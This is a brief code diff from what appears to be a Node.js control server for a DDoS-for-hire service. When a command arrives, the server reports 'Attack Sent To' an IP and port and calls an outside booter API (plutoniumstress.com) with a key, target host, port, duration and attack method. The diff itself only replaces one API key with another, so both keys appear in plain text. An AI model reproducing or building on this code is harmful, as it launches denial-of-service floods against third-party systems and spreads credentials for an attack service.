@@ -100,7 +100,7 @@ server.on('connection', function(socket) {
                         socket.write("Attack Sent To " + ip + ":" + port + " for " + time + " seconds with " + method);
                     }
                 })
-                f('https://plutoniumstress.com/api/api.php?key=UlzXDMT60CmBP3p8&vip=0&host=' +ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
+                f('https://plutoniumstress.com/api/api.php?key=zOv4QAaLO0WZayKu&vip=0&host=' +ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
                     console.log(body);
                 })
             } else if(cleanSTR.startsWith("exit")) {
